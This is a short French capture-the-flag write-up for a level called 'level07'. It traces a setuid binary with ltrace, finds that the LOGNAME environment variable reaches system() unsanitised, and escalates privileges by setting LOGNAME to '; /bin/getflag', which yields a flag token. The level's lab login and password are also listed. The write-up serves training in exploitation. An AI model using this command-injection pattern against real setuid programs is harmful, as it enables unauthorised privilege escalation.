# LEVEL 07

**LOGIN: level07**

**PASSWORD: level07**

 ----
 
 ```
  ls -l ; echo ; file level07 
total 12
-rwsr-sr-x 1 flag07 level07 8805 Mar  5  2016 level07

level07: setuid setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0x26457afa9b557139fa4fd3039236d1bf541611d0, not stripped
```

```
./level07 
level07
```
 
 On sait qu'on a une variable d'environnement `LOGNAME=level07`
 
Pour test : 
```
LOGNAME=toto ./level07
toto
```

``` 
ltrace ./level07 
__libc_start_main(0x8048514, 1, 0xbffff7f4, 0x80485b0, 0x8048620 <unfinished ...>
getegid()                                             = 2007
geteuid()                                             = 2007
setresgid(2007, 2007, 2007, 0xb7e5ee55, 0xb7fed280)   = 0
setresuid(2007, 2007, 2007, 0xb7e5ee55, 0xb7fed280)   = 0
getenv("LOGNAME")                                     = "level07"
asprintf(0xbffff744, 0x8048688, 0xbfffff62, 0xb7e5ee55, 0xb7fed280) = 18
system("/bin/echo level07 "level07
 <unfinished ...>
```

La chaine `/bin/echo level07` a une len de 18, comme le retour de asprintf.

Pour test :
``` 
LOGNAME=toto ltrace ./level07
__libc_start_main(0x8048514, 1, 0xbffff7f4, 0x80485b0, 0x8048620 <unfinished ...>
getegid()                                             = 2007
geteuid()                                             = 2007
setresgid(2007, 2007, 2007, 0xb7e5ee55, 0xb7fed280)   = 0
setresuid(2007, 2007, 2007, 0xb7e5ee55, 0xb7fed280)   = 0
getenv("LOGNAME")                                     = "toto"
asprintf(0xbffff744, 0x8048688, 0xbffff916, 0xb7e5ee55, 0xb7fed280) = 15
system("/bin/echo toto "toto
 <unfinished ...>
--- SIGCHLD (Child exited) ---
<... system resumed> )                                = 0
+++ exited (status 0) +++
```

`system` est donc appelé avec le retour asprintf, on peut donc injecter une commande dans le subshell

```
LOGNAME="; /bin/getflag" ./level07
Check flag.Here is your token : fiumuikeil55xe9cu4dood66h
```

**TOKEN: fiumuikeil55xe9cu4dood66h**




